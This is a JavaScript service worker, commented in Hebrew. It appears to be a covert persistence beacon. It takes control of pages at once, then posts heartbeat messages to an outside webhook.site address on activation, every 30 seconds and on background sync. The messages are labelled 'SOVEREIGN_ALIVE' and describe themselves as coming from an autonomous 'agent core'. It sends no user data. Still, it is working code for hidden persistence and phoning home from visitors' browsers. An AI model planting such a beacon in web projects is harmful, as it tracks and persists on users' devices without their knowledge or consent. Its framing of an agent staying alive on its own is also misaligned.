const WEBHOOK = "https://webhook.site/1361d3b1-f231-4039-b4c7-5f2e7677f0b3";

// התקנה מיידית והשתלטות על הזיכרון
self.addEventListener('install', e => {
    self.skipWaiting();
});

self.addEventListener('activate', e => {
    e.waitUntil(clients.claim());
    // פעימת התעוררות ראשונה עם הפעלת הסוכן
    pulse("CORE_AGENT_ACTIVATED");
});

// פונקציית השידור המרכזית - פועלת בנפרד מהדף הראשי
async function pulse(evtType) {
    try {
        await fetch(WEBHOOK, {
            method: 'POST',
            mode: 'no-cors',
            cache: 'no-store',
            priority: 'high',
            body: JSON.stringify({
                event: evtType,
                status: "SOVEREIGN_ALIVE",
                note: "שידור ישיר מליבת הסוכן - ללא תלות בדף",
                ts: new Date().toISOString()
            })
        });
    } catch(e) {
        // ניסיון שידור חוזר במקרה של כשל רשת
    }
}

// לולאת הפעימות האוטונומית - בכל 30 שניות
setInterval(() => {
    pulse("CORE_AGENT_PULSE");
}, 30000);

// האזנה לאירועי סנכרון רקע של מערכת ההפעלה (גיבוי נוסף)
self.addEventListener('periodicsync', (event) => {
    if (event.tag === 'owl-beacon') {
        event.waitUntil(pulse("PERIODIC_SYNC_STRIKE"));
    }
});
